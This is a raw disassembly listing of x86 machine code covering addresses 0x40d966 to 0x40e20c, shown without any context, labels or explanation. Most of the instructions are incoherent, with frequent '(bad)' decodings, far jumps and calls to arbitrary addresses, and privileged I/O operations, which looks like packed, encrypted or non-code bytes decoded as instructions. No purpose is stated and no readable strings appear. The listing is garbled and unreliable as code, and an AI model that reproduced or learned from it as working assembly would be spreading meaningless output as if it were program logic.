  40d966:	outs   dx,BYTE PTR ds:[esi]
  40d967:	(bad)  
  40d96a:	and    al,0x2e
  40d96c:	int    0xfe
  40d96e:	repz add dh,al
  40d971:	cs mov ebx,0x4f0c33af
  40d977:	add    BYTE PTR [edi-0x4b],0x51
  40d97b:	jp     0x40d9a0
  40d97d:	int3   
  40d97e:	rol    BYTE PTR [edx],0xe9
  40d981:	add    ah,BYTE PTR [edi+0x381ce59a]
  40d987:	mov    al,0x5f
  40d989:	ds cmp ebx,esp
  40d98c:	lea    ebp,[eax+0xffbaf96]
  40d992:	and    BYTE PTR [esi],dh
  40d994:	icebp  
  40d995:	stos   DWORD PTR es:[edi],eax
  40d996:	sub    ah,BYTE PTR [edx]
  40d998:	jbe    0x40d94e
  40d99a:	sbb    eax,0xa48a7556
  40d99f:	ins    BYTE PTR es:[edi],dx
  40d9a0:	lods   eax,DWORD PTR ds:[esi]
  40d9a1:	clc    
  40d9a2:	sub    DWORD PTR [edx+0x462daada],0xfffffffd
  40d9a9:	cmp    BYTE PTR [eax-0x17fb2bfe],0x35
  40d9b0:	cmp    eax,0x3e28e6ab
  40d9b5:	mov    ah,0x8d
  40d9b7:	ret    0xca95
  40d9ba:	out    0x16,al
  40d9bc:	jmp    0xebef2541
  40d9c1:	add    al,0x0
	...
  40d9d7:	sub    ch,BYTE PTR [eax-0x18]
  40d9da:	add    esp,DWORD PTR [edi+0x42a815db]
  40d9e0:	jnp    0x40d995
  40d9e2:	scas   eax,DWORD PTR es:[edi]
  40d9e3:	sbb    eax,0xea004307
  40d9e8:	mov    dl,0x92
  40d9ea:	add    esi,edi
  40d9ec:	scas   eax,DWORD PTR es:[edi]
  40d9ed:	(bad)  
  40d9ee:	jnp    0x40d98c
  40d9f0:	call   0x5cfe:0xb0538f27
  40d9f7:	lahf   
  40d9f8:	scas   eax,DWORD PTR es:[edi]
  40d9f9:	je     0x40d9ec
  40d9fb:	sbb    al,0x11
  40d9fd:	popa   
  40d9fe:	(bad)  
  40d9ff:	xor    al,0x7a
  40da01:	inc    esp
  40da02:	popf   
  40da03:	mov    DWORD PTR [edx],eax
  40da05:	(bad)  
  40da06:	cmp    al,0xbf
  40da08:	scas   eax,DWORD PTR es:[edi]
  40da09:	je     0x40d9fc
  40da0b:	cmp    al,0x3a
  40da0d:	clc    
  40da0e:	mov    dh,0x14
  40da10:	jl     0x40da5e
  40da12:	aad    0x21
  40da14:	jmp    0x9574:0xafa41bff
  40da1b:	sbb    ebx,DWORD PTR ds:0xdbf49666
  40da21:	mov    edi,0x13c0ea2e
  40da26:	jmp    0x7e591080
  40da2b:	ficom  WORD PTR [esi]
  40da2d:	(bad)  
  40da2e:	cld    
  40da2f:	push   eax
  40da30:	mov    al,0x74
  40da32:	fst    QWORD PTR [ebp+0x36]
  40da35:	or     BYTE PTR [ecx+0x18],dl
  40da38:	lods   eax,DWORD PTR ds:[esi]
  40da39:	(bad)  
  40da3a:	pop    esi
	...
  40da4f:	add    al,bh
  40da51:	outs   dx,BYTE PTR ds:[esi]
  40da52:	je     0x40da3a
  40da54:	xor    eax,0x5c41f436
  40da59:	sub    bh,bh
  40da5b:	inc    esi
  40da5c:	add    BYTE PTR [edi+0x5e],ch
  40da5f:	xor    cl,ah
  40da61:	adc    al,BYTE PTR [eax]
  40da63:	scas   al,BYTE PTR es:[edi]
  40da64:	shr    DWORD PTR ds:0xb027bbf8,0x74
  40da6b:	add    esp,esi
  40da6d:	xor    eax,0xba7e1e14
  40da72:	(bad)  
  40da73:	pushf  
  40da74:	mov    al,0xaf
  40da76:	je     0x40da59
  40da78:	or     al,0x25
  40da7a:	inc    BYTE PTR [eax]
  40da7c:	test   eax,0x89c00971
  40da81:	jnp    0x40dad3
  40da83:	add    DWORD PTR [esi+0x2],edi
  40da86:	push   DWORD PTR [ebp-0x6e]
  40da89:	mov    dl,BYTE PTR [esi+eiz*2]
  40da8c:	mov    DWORD PTR [ecx+0x29],esi
  40da8f:	sar    BYTE PTR [ecx+0x7e14c06f],0x8f
  40da96:	cmp    al,0x1
  40da98:	jle    0x40da9c
  40da9a:	cmp    DWORD PTR [ebp+0x6a],0x3
  40da9e:	jne    0x40e1f6
  40daa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa5:	jno    0x40da8e
  40daa7:	and    al,0x3f
  40daa9:	add    al,BYTE PTR [eax]
  40daab:	mov    eax,DWORD PTR [ebx-0x3bfb7696]
  40dab1:	add    al,0x45
  40dab3:	lock add BYTE PTR [eax],al
	...
  40dac6:	add    BYTE PTR [eax],al
  40dac8:	add    BYTE PTR [esi+eax*1-0x516c00b0],ah
  40dacf:	out    0x74,al
  40dad1:	retf   
  40dad2:	jno    0x40dad1
  40dad4:	push   0xe
  40dad6:	jno    0x40db4b
  40dad8:	adc    al,0x99
  40dada:	jmp    0xfffd:0x685de807
  40dae1:	jne    0x40db25
  40dae3:	adc    al,0x83
  40dae5:	mov    DWORD PTR [esi],0xea590f75
  40daeb:	repz call 0x3fb5b7
  40daf1:	mov    ch,0xc6
  40daf3:	pop    ebp
  40daf4:	leave  
  40daf5:	mov    WORD PTR ds:0xf5ac0b00,ss
  40dafb:	add    al,0xe9
  40dafd:	mov    al,BYTE PTR [ecx]
  40daff:	add    BYTE PTR [eax],al
  40db01:	aaa    
  40db02:	cmp    ch,ah
  40db04:	push   0xffffffce
  40db06:	jo     0x40db7b
  40db08:	adc    al,0xa7
  40db0a:	adc    al,0x38
  40db0c:	or     BYTE PTR [edi-0x5f014678],bh
  40db12:	xor    BYTE PTR [eax+0x14],al
  40db15:	and    al,0xc2
  40db17:	add    dh,BYTE PTR [ebp-0x60]
  40db1a:	mov    ah,0x36
  40db1c:	hlt    
  40db1d:	jg     0x40db72
  40db1f:	sub    bh,bh
  40db21:	adc    BYTE PTR [eax],0xc4
  40db24:	pop    esi
  40db25:	outs   dx,BYTE PTR ds:[esi]
  40db26:	pop    ecx
  40db27:	pop    ss
  40db28:	add    BYTE PTR [eax+0xe],dh
  40db2b:	enter  0x65,0x0
	...
  40db3f:	add    BYTE PTR [eax],al
  40db41:	add    dh,ah
  40db43:	fwait
  40db44:	jg     0x40db8a
  40db46:	dec    edi
  40db47:	xor    BYTE PTR [edi-0x18],al
  40db4a:	and    al,0xd3
  40db4c:	inc    eax
  40db4e:	inc    edi
  40db4f:	sahf   
  40db50:	fcmovnbe st,st(1)
  40db52:	push   cs
  40db53:	pop    esp
  40db54:	add    eax,DWORD PTR [eax]
  40db56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db57:	mov    WORD PTR [edx+0x79b44f82],?
  40db5d:	inc    esp
  40db5e:	inc    edi
  40db5f:	sbb    BYTE PTR [edi],bl
  40db61:	call   0xec87fbea
  40db66:	(bad)  
  40db68:	fwait
  40db69:	jbe    0x40db10
  40db6b:	nop
  40db6c:	fisubr DWORD PTR [edx]
  40db6e:	cmc    
  40db6f:	pop    ds
  40db70:	inc    edi
  40db71:	in     al,dx
  40db72:	mov    esp,0x728aa3e6
  40db77:	push   ebx
  40db78:	test   eax,eax
  40db7a:	les    ebx,FWORD PTR [eax]
  40db7c:	fwait
  40db7d:	add    edi,eax
  40db7f:	dec    ecx
  40db80:	add    eax,0x57220755
  40db85:	in     al,0x2c
  40db87:	pop    esi
  40db88:	call   0x1c05:0x3547623a
  40db8f:	pop    esi
  40db90:	mov    ds:0x4720a4ea,al
  40db95:	in     al,0xc0
  40db97:	add    DWORD PTR [edi+edx*1+0x540d36b8],ebx
  40db9e:	mov    al,0x36
  40dba0:	loope  0x40db3d
  40dba2:	pop    es
  40dba3:	mov    ch,0xd
  40dba5:	mov    cl,0x0
	...
  40dbbb:	lods   eax,DWORD PTR ds:[esi]
  40dbbc:	ret    0x7b
  40dbbf:	cwde   
  40dbc0:	ss cmc 
  40dbc2:	fwait
  40dbc3:	mov    dl,0x25
  40dbc5:	div    BYTE PTR [eax-0x45723d43]
  40dbcb:	popw   ss
  40dbcd:	jmp    0x720fbf4c
  40dbd2:	shl    DWORD PTR [ebx],cl
  40dbd4:	inc    esi
  40dbd5:	mov    ebp,0xb1461a53
  40dbda:	push   ebx
  40dbdb:	cmc    
  40dbdc:	call   0x466f:0xac59ac62
  40dbe3:	ja     0x40db91
  40dbe5:	cmp    edx,eax
  40dbe7:	inc    eax
  40dbe8:	and    eax,0x8041b10d
  40dbed:	and    edx,esp
  40dbef:	cmp    BYTE PTR [eax],dh
  40dbf1:	cld    
  40dbf2:	test   BYTE PTR [ebx-0x6fc81736],dh
  40dbf8:	stos   DWORD PTR es:[edi],eax
  40dbf9:	adc    ebx,eax
  40dbfb:	and    DWORD PTR [esi],esi
  40dbfd:	mov    eax,ds:0x7dfe93b0
  40dc02:	ss lahf 
  40dc04:	stos   DWORD PTR es:[edi],eax
  40dc05:	sbb    ecx,DWORD PTR [eax+ecx*1]
  40dc08:	ss xchg ecx,eax
  40dc0a:	fwait
  40dc0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc0d:	gs mov al,0x61
  40dc10:	out    0xdb,eax
  40dc12:	stos   DWORD PTR es:[edi],eax
  40dc13:	mov    eax,ds:0xe9b13980
  40dc18:	stos   DWORD PTR es:[edi],eax
  40dc19:	dec    ebp
  40dc1a:	fistp  DWORD PTR ss:[edx+0x272c]
	...
  40dc31:	add    BYTE PTR [eax],al
  40dc33:	add    al,bl
  40dc35:	stos   DWORD PTR es:[edi],eax
  40dc36:	add    BYTE PTR [edx],0xa7
  40dc39:	add    al,BYTE PTR [eax]
  40dc3b:	jmp    0xd60295b7
  40dc40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc41:	push   ebp
  40dc42:	mov    edx,DWORD PTR ds:0xf174ab5f
  40dc48:	or     al,0xb0
  40dc4a:	jno    0x40dc62
  40dc4c:	mul    DWORD PTR [ebx]
  40dc4e:	add    ah,BYTE PTR [ebp+0x7cff02e5]
  40dc54:	pushf  
  40dc55:	mov    ds:0x2a4b63c,eax
  40dc5a:	or     ebp,DWORD PTR [ecx]
  40dc5c:	rol    DWORD PTR ds:0x36a205f,1
  40dc62:	add    BYTE PTR [edi+0x54ff02a3],ch
  40dc68:	jae    0x40dc0d
  40dc6a:	rcr    BYTE PTR [ebx+0x38],cl
  40dc6d:	lods   al,BYTE PTR ds:[esi]
  40dc6e:	mov    esi,0x41e8e5
  40dc73:	(bad)  
  40dc74:	sahf   
  40dc75:	cli    
  40dc76:	push   esi
  40dc77:	shr    DWORD PTR [edx+0x4de8fff4],1
  40dc7d:	imul   esi,DWORD PTR [esp+eiz*8-0xf],0xffffffb9
  40dc82:	shl    ecx,0xa4
  40dc85:	scas   al,BYTE PTR es:[edi]
  40dc86:	xor    ch,BYTE PTR [ecx-0x6901533e]
  40dc8c:	clc    
  40dc8d:	mov    al,0xad
  40dc8f:	shr    DWORD PTR [ecx-0x21791fcb],1
  40dc95:	cli    
  40dc96:	out    0x5,eax
	...
  40dcac:	add    BYTE PTR [esi],cl
  40dcae:	stos   DWORD PTR es:[edi],eax
  40dcaf:	(bad)  
  40dcb0:	loop   0x40dc96
  40dcb2:	xor    eax,0xc1420e05
  40dcb7:	pop    es
  40dcb8:	jmp    0xa884d359
  40dcbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcbe:	stos   DWORD PTR es:[edi],eax
  40dcbf:	je     0x40dca2
  40dcc1:	or     al,0xb7
  40dcc3:	xor    al,0xe9
  40dcc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcc6:	idiv   DWORD PTR [edi-0x251e500]
  40dccc:	jne    0x40dc90
  40dcce:	sub    eax,DWORD PTR [esp+ecx*8]
  40dcd1:	fadd   DWORD PTR [ebp+0x0]
  40dcd4:	push   0x4142d1
  40dcd9:	sub    ecx,0xa94ce807
  40dcdf:	(bad)  
  40dce0:	inc    ebp
  40dce2:	mov    esi,0xebb10973
  40dce7:	or     ecx,DWORD PTR [edi+0x4164d68b]
  40dced:	jle    0x40dcfd
  40dcef:	dec    esi
  40dcf0:	inc    esp
  40dcf1:	aas    
  40dcf2:	push   es
  40dcf3:	push   DWORD PTR [ebp-0x7a]
  40dcf6:	mov    ss,WORD PTR [esi+0xb068e35]
  40dcfc:	rcr    bl,0xa7
  40dcff:	std    
  40dd00:	jne    0x40dc84
  40dd02:	sub    DWORD PTR [esp+edx*8],eax
  40dd05:	call   0x4ff8dd49
  40dd0a:	push   es
  40dd0b:	add    BYTE PTR [eax],al
  40dd0d:	mov    cl,0x67
  40dd0f:	ror    BYTE PTR [eax],0x0
	...
  40dd26:	ds dec ebx
  40dd28:	mov    ebp,esp
  40dd2a:	int    0xc1
  40dd2c:	repnz push esi
  40dd2e:	jns    0x40dd36
  40dd30:	inc    BYTE PTR [ebx+0x7f]
  40dd33:	(bad)  
  40dd34:	(bad)  
  40dd35:	jne    0x40dd7d
  40dd37:	mov    es,WORD PTR [esi+esi*1-0x3ff4f9f2]
  40dd3e:	sbb    eax,DWORD PTR [eax]
  40dd40:	pop    edi
  40dd41:	pop    esi
  40dd42:	push   edi
  40dd43:	les    eax,FWORD PTR [edx]
  40dd45:	add    BYTE PTR [esi+0x138bef2d],bh
  40dd4b:	scas   al,BYTE PTR es:[edi]
  40dd4c:	jmp    0x3cc70752
  40dd51:	add    bl,bl
  40dd53:	pop    ebx
  40dd54:	mov    ds:0x469ba768,al
  40dd59:	inc    ecx
  40dd5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd5b:	cmp    BYTE PTR [eax],bh
  40dd5d:	or     bh,cl
  40dd5f:	mov    ebx,0xb4d0fff4
  40dd64:	ret    0xa174
  40dd67:	nop
  40dd68:	dec    esp
  40dd69:	leave  
  40dd6a:	in     eax,0x9f
  40dd6c:	add    cl,BYTE PTR [ebx+0x2199b33a]
  40dd72:	daa    
  40dd73:	leave  
  40dd74:	sti    
  40dd75:	jae    0x40dd05
  40dd77:	sbb    ebp,esi
  40dd79:	or     al,0x1b
  40dd7b:	mov    al,0x82
  40dd7d:	lods   eax,DWORD PTR ds:[esi]
  40dd7f:	daa    
  40dd80:	(bad)  
  40dd81:	jg     0x40dd53
  40dd83:	fs or  ah,BYTE PTR ss:[edi]
  40dd87:	jo     0x40ddd8
  40dd89:	je     0x40dd8b
	...
  40dd9f:	stos   BYTE PTR es:[edi],al
  40dda0:	sbb    ebp,esi
  40dda2:	pop    edi
  40dda3:	repnz pushf 
  40dda5:	les    eax,FWORD PTR [esi]
  40dda7:	(bad)  
  40dda8:	loopne 0x40dd2d
  40ddaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddac:	inc    esi
  40ddad:	retf   
  40ddae:	(bad)  
  40ddaf:	jmp    0xc39b:0xa70003b7
  40ddb6:	inc    esp
  40ddb7:	dec    edi
  40ddb8:	fwait
  40ddb9:	add    al,BYTE PTR [eax]
  40ddbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddbc:	and    al,0x2f
  40ddbe:	or     BYTE PTR [esp+eiz*8-0x7d],cl
  40ddc2:	add    BYTE PTR ds:[esi],0xd9
  40ddc6:	xor    BYTE PTR [edx-0x6a8afc79],0x88
  40ddcd:	inc    esi
  40ddce:	clc    
  40ddcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddd0:	fwait
  40ddd1:	add    al,BYTE PTR [eax]
  40ddd3:	xchg   edx,eax
  40ddd4:	lahf   
  40ddd5:	ret    
  40ddd6:	inc    esp
  40ddd7:	adc    ebx,DWORD PTR [edx-0x7b58fffe]
  40dddd:	adc    bh,dh
  40dddf:	push   0x33
  40dde1:	add    eax,DWORD PTR [eax]
  40dde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dde4:	add    ch,cl
  40dde6:	ss popf 
  40dde8:	shl    ch,0xe3
  40ddeb:	loope  0x40de2b
  40dded:	push   ebp
  40ddee:	add    al,0xa7
  40ddf0:	add    ch,cl
  40ddf2:	sbb    DWORD PTR [ecx-0x2ff943ba],0x3e
  40ddf9:	inc    ecx
  40ddfa:	cdq    
  40ddfb:	mov    eax,ds:0xc0ababc1
  40de00:	test   al,0xe8
  40de02:	add    eax,DWORD PTR [eax]
	...
  40de18:	and    al,0x27
  40de1a:	and    eax,0x27053a03
  40de1f:	add    eax,0xed694187
  40de24:	mov    al,ds:0x1b79592f
  40de29:	sti    
  40de2a:	adc    DWORD PTR [eax],edx
  40de2c:	daa    
  40de2d:	call   0x82f214fa
  40de32:	jne    0x40de36
  40de34:	(bad)  
  40de35:	sub    eax,0x18c54d9
  40de3a:	jae    0x40de80
  40de3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de3d:	jp     0x40de24
  40de3f:	inc    esp
  40de40:	daa    
  40de41:	call   0x489b152e
  40de46:	push   ds
  40de47:	inc    ebp
  40de48:	daa    
  40de49:	call   0xc0b11536
  40de4e:	and    edi,DWORD PTR [eax+0x3e8a848]
  40de54:	sub    al,0x2e
  40de56:	loope  0x40ded0
  40de58:	mov    ebx,0xb0e191fa
  40de5d:	out    0xcc,eax
  40de5f:	ss mov eax,eax
  40de62:	in     eax,dx
  40de63:	add    esp,DWORD PTR [eax]
  40de65:	cs xchg ebp,eax
  40de67:	push   ebp
  40de68:	paddusb mm0,QWORD PTR [esi-0x5703ee54]
  40de6f:	mov    eax,ss:0x3c170047
  40de75:	ret    0xe903
  40de78:	jg     0x40de2a
  40de7a:	inc    ebp
  40de7b:	data16 add BYTE PTR [eax],al
	...
  40de8e:	add    BYTE PTR [eax],al
  40de90:	add    BYTE PTR [ecx-0x52],ch
  40de93:	inc    esi
  40de94:	imul   edi,ebx,0x133073a7
  40de9a:	das    
  40de9b:	hlt    
  40de9c:	mov    bh,0x3c
  40de9e:	cld    
  40de9f:	std    
  40dea0:	inc    esi
  40dea1:	add    ecx,DWORD PTR [ecx+0x5e]
  40dea4:	xor    dh,ah
  40dea6:	add    eax,DWORD PTR [eax]
  40dea8:	pushf  
  40dea9:	aas    
  40deaa:	fwait
  40deab:	and    BYTE PTR ds:0x6a574dfc,0x81
  40deb2:	push   cs
  40deb3:	add    BYTE PTR [ebp-0x44c37b53],dl
  40deb9:	jge    0x40defd
  40debb:	add    cl,ch
  40debd:	rol    DWORD PTR [eax],1
  40debf:	pop    edi
  40dec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec1:	dec    ebp
  40dec2:	ror    DWORD PTR [edi],0xe9
  40dec5:	(bad)  
  40dec7:	adc    al,0xb0
  40dec9:	test   eax,0xa4a865b6
  40dece:	test   DWORD PTR [edx+0x2aa8a],0x65d2a620
  40ded8:	sub    BYTE PTR [ebx-0x5d897d09],ch
  40dede:	add    al,BYTE PTR [eax]
  40dee0:	add    BYTE PTR [esi-0x5cd79a32],ah
  40dee6:	test   DWORD PTR [edx+0x2aa62],0x4faee65c
  40def0:	je     0x40ded8
  40def2:	stos   BYTE PTR es:[edi],al
  40def3:	dec    edi
  40def4:	ins    BYTE PTR es:[edi],dx
	...
  40df09:	add    dh,ah
  40df0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df0c:	dec    edi
  40df0d:	xchg   esi,eax
  40df0e:	push   ss
  40df0f:	mov    ebx,0xa7a32865
  40df14:	je     0x40df16
  40df16:	out    dx,al
  40df17:	mov    bh,BYTE PTR [eax+edi*8+0x458b5b89]
  40df1e:	es dec esi
  40df20:	lea    eax,[ebp+0x7a]
  40df23:	dec    esi
  40df24:	lea    eax,[ebp+0x4e]
  40df27:	dec    esi
  40df28:	push   DWORD PTR ds:0x40e4b2
  40df2e:	jns    0x40df21
  40df30:	psubsb mm4,QWORD PTR [edx]
  40df33:	push   esi
  40df34:	std    
  40df35:	call   FWORD PTR [ebx+0x41]
  40df38:	fcom   QWORD PTR [eax+0x3b]
  40df3b:	inc    ecx
  40df3c:	loopne 0x40df8e
  40df3e:	dec    ebx
  40df3f:	inc    ecx
  40df40:	in     al,0x50
  40df42:	mov    DWORD PTR [ecx+0x2ff66ce],esi
  40df48:	push   DWORD PTR [ebp-0x52]
  40df4b:	mov    cl,BYTE PTR [eax-0x2a64608]
  40df51:	jne    0x40def5
  40df53:	sub    DWORD PTR [esp+edx*8-0x57],eax
  40df57:	repz fisttp DWORD PTR [edi+0x45c5ba43]
  40df5e:	sahf   
  40df5f:	(bad)  
  40df60:	(bad)  
  40df61:	dec    DWORD PTR [esi-0x5133bbd5]
  40df67:	add    al,0x1
  40df69:	push   0x7e
  40df6b:	or     BYTE PTR [eax],al
  40df6d:	push   0x0
	...
  40df83:	dec    esi
  40df84:	or     BYTE PTR [eax],al
  40df86:	lea    eax,[ebx+0x73ff4ed2]
  40df8c:	push   eax
  40df8d:	sub    DWORD PTR [ecx+0x3e],eax
  40df90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df91:	mov    esi,0xffa7d20f
  40df96:	dec    DWORD PTR [esi+0x7d]
  40df99:	jnp    0x40df6b
  40df9b:	ds test eax,0x23f0082
  40dfa1:	add    BYTE PTR [ebx+0x3ab7dea7],cl
  40dfa7:	push   0x7f
  40dfa9:	stc    
  40dfaa:	xchg   BYTE PTR [ebx],bl
  40dfac:	pushf  
  40dfad:	add    al,BYTE PTR [eax]
  40dfaf:	or     esi,DWORD PTR [ecx]
  40dfb1:	xor    al,dl
  40dfb3:	sub    al,0xaf
  40dfb5:	(bad)  
  40dfb6:	mov    ch,BYTE PTR [edx-0x79]
  40dfb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfba:	add    esp,esi
  40dfbc:	ja     0x40df67
  40dfbe:	je     0x40df9b
  40dfc0:	adc    al,0x40
  40dfc2:	in     al,0xe0
  40dfc4:	(bad)  
  40dfc5:	shl    bh,cl
  40dfc7:	clc    
  40dfc8:	or     DWORD PTR [eax+eax*1],eax
  40dfcb:	and    al,0xbf
  40dfcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfce:	call   FWORD PTR [ecx-0x3f0046e1]
  40dfd4:	fwait
  40dfd5:	test   DWORD PTR [edi+esi*4-0x65],edi
  40dfd9:	stc    
  40dfda:	sub    ebx,0xffffff9b
  40dfdd:	add    al,BYTE PTR [eax]
  40dfdf:	and    al,0x87
  40dfe1:	sahf   
  40dfe2:	push   DWORD PTR [ecx+0xff6d17]
	...
  40dffc:	cwde   
  40dffd:	fwait
  40dffe:	test   eax,0x6d139374
  40e003:	pusha  
  40e004:	mov    BYTE PTR [edx+edi*2+0x2eac6f44],ah
  40e00b:	cld    
  40e00c:	js     0x40e03c
  40e00e:	mov    ebx,0x9bc7fafe
  40e013:	fild   WORD PTR [esi]
  40e015:	lds    ebp,FWORD PTR [eax+0x42d80267]
  40e01b:	add    BYTE PTR [edi+0x47],cl
  40e01e:	idiv   bh
  40e020:	push   eax
  40e021:	or     ebx,DWORD PTR [ebx*2-0xfc251d]
  40e028:	mov    edx,0x732d9b63
  40e02d:	fwait
  40e02e:	add    cl,BYTE PTR [ebx]
  40e030:	add    bl,BYTE PTR [di]
  40e033:	or     al,0xbf
  40e035:	push   ds
  40e036:	and    eax,0x189aa743
  40e03b:	neg    BYTE PTR [eax]
  40e03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e03e:	cmp    BYTE PTR [ebx+ecx*4],bl
  40e041:	sub    BYTE PTR ds:[eax+ecx*1],al
  40e045:	das    
  40e046:	mov    cl,0x9c
  40e048:	xchg   esi,eax
  40e049:	out    dx,al
  40e04a:	call   0xf5038c52
  40e04f:	or     edi,DWORD PTR [edi+0x16]
  40e052:	lods   eax,DWORD PTR ds:[esi]
  40e053:	inc    edx
  40e054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e055:	call   0x1bb8:0xa4e0f5b4
  40e05c:	dec    ebx
  40e05d:	ds test al,0x3
	...
  40e074:	add    al,dl
  40e076:	xor    DWORD PTR cs:[edx+edx*8-0x53fc1710],ebx
  40e07e:	ret    0x3ebb
  40e081:	dec    edi
  40e082:	add    ch,cl
  40e084:	cwde   
  40e085:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e087:	fwait
  40e088:	test   eax,0xa1a8bb67
  40e08e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e08f:	fstp   TBYTE PTR [ebx-0x5716bdfe]
  40e095:	sbb    esi,edi
  40e097:	adc    BYTE PTR [eax-0x15],bl
  40e09a:	mov    ds:0xa6fba8fd,eax
  40e09f:	cmc    
  40e0a0:	cs jae 0x40e047
  40e0a3:	jae    0x40e09c
  40e0a5:	mov    bh,cl
  40e0a7:	inc    ebx
  40e0a8:	test   eax,0xb453a469
  40e0ad:	popa   
  40e0ae:	shr    DWORD PTR cs:[eax-0x3e3f092d],0xf3
  40e0b6:	mov    ds:0x9ed3a8c5,eax
  40e0bb:	mov    ebp,0xffa4632e
  40e0c0:	cmp    edi,DWORD PTR [edi]
  40e0c2:	pushf  
  40e0c3:	mov    bh,0xc
  40e0c5:	(bad)  
  40e0c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0c7:	(bad)  
  40e0c8:	sbb    al,0xeb
  40e0ca:	fwait
  40e0cb:	lock or DWORD PTR [esi-0x5b],ecx
  40e0cf:	pop    esi
  40e0d0:	aaa    
  40e0d1:	pop    esp
  40e0d2:	ret    0xe90f
  40e0d5:	popa   
  40e0d6:	ja     0x40e0c3
  40e0d8:	push   0x0
	...
  40e0ee:	dec    eax
  40e0ef:	pushf  
  40e0f0:	cmp    ah,0xb0
  40e0f3:	std    
  40e0f4:	push   cs
  40e0f5:	ins    BYTE PTR es:[edi],dx
  40e0f6:	xchg   ebx,eax
  40e0f7:	add    DWORD PTR [eax],eax
  40e0f9:	jmp    0xba351f77
  40e0fe:	jno    0x40e13e
  40e100:	clc    
  40e101:	mov    ecx,0xb9fc3e59
  40e106:	mov    edx,0xb4d4ff00
  40e10b:	call   0xbc82:0xa4ff3e20
  40e112:	or     al,0x3
  40e114:	(bad)  
  40e116:	repz mov ds:0x2effe9fe,eax
  40e11c:	hlt    
  40e11d:	jbe    0x40e188
  40e11f:	mov    dl,0x67
  40e121:	int3   
  40e122:	loopne 0x40e165
  40e124:	add    BYTE PTR [esi],dl
  40e126:	leave  
  40e127:	mov    dl,0xe7
  40e129:	ret    
  40e12a:	call   0x84f4:0x64f2fea3
  40e131:	and    DWORD PTR [edx+eax*1-0x51469c00],esp
  40e138:	dec    edi
  40e139:	pop    esp
  40e13a:	mov    cl,0xaa
  40e13c:	dec    edi
  40e13d:	je     0x40e125
  40e13f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e140:	dec    edi
  40e141:	push   ebx
  40e142:	stos   DWORD PTR es:[edi],eax
  40e143:	mov    ds:0x9d3cf974,eax
  40e148:	cmc    
  40e149:	into   
  40e14a:	or     BYTE PTR [eax-0x299ff84],al
  40e150:	push   cs
  40e151:	test   DWORD PTR [eax],eax
	...
  40e167:	es (bad) 
  40e169:	(bad)  
  40e16a:	push   ecx
  40e16c:	lock repz push 0x413ef6
  40e173:	push   ss
  40e174:	lods   eax,DWORD PTR ds:[esi]
  40e175:	xor    BYTE PTR [eax],al
  40e177:	push   cs
  40e178:	test   al,0xbe
  40e17a:	jnp    0xff40e09f
  40e180:	sub    DWORD PTR [esp+esi*8-0x52],eax
  40e184:	sub    DWORD PTR [eax+edi*8-0x62],eax
  40e188:	sub    DWORD PTR [esp+edi*8-0x62],eax
  40e18c:	or     BYTE PTR [ebx],al
  40e18e:	(bad)  
  40e18f:	sti    
  40e190:	push   cs
  40e191:	call   0xfd9c2a47
  40e196:	add    DWORD PTR [ebx],0x57
  40e199:	dec    BYTE PTR [esi]
  40e19b:	dec    ebx
  40e19c:	jg     0x40e19c
  40e19e:	(bad)  
  40e19f:	mov    esi,0x61f44427
  40e1a4:	scas   al,BYTE PTR es:[edi]
  40e1a5:	lea    eax,[ebp+0x72]
  40e1a8:	sub    DWORD PTR [esp+esi*8+0x1e],eax
  40e1ac:	sub    al,BYTE PTR [eax+edi*8+0xe]
  40e1b0:	sub    al,BYTE PTR [esp+edi*8-0x12]
  40e1b4:	or     BYTE PTR [edi+edi*8],al
  40e1b7:	cmp    esi,esi
  40e1b9:	out    0x89,eax
  40e1bb:	mov    eax,0x2383fd69
  40e1c0:	outs   dx,BYTE PTR ds:[esi]
  40e1c1:	push   DWORD PTR [ecx+eax*2+0x61]
  40e1c5:	add    ecx,esp
  40e1c7:	sub    BYTE PTR [edi+0x0],al
  40e1ca:	inc    DWORD PTR [eax]
	...
  40e1e0:	jno    0x40e24b
  40e1e2:	std    
  40e1e3:	(bad)  
  40e1e4:	mov    esi,DWORD PTR [esi+0x697e4164]
  40e1ea:	std    
  40e1eb:	inc    DWORD PTR [ecx-0x582bfc9f]
  40e1f1:	push   ecx
  40e1f2:	inc    ebp
  40e1f3:	add    BYTE PTR [eax-0x2f],dl
  40e1f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f7:	dec    BYTE PTR [eax-0x21]
  40e1fa:	scas   eax,DWORD PTR es:[edi]
  40e1fb:	out    0xa5,eax
  40e1fd:	pop    edi
  40e1fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1ff:	(bad)  
  40e200:	pusha  
  40e201:	out    dx,eax
  40e202:	fwait
  40e203:	add    BYTE PTR [edi+0x6a8302ab],ah
  40e209:	push   edi
  40e20a:	sbb    al,0x41
  40e20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
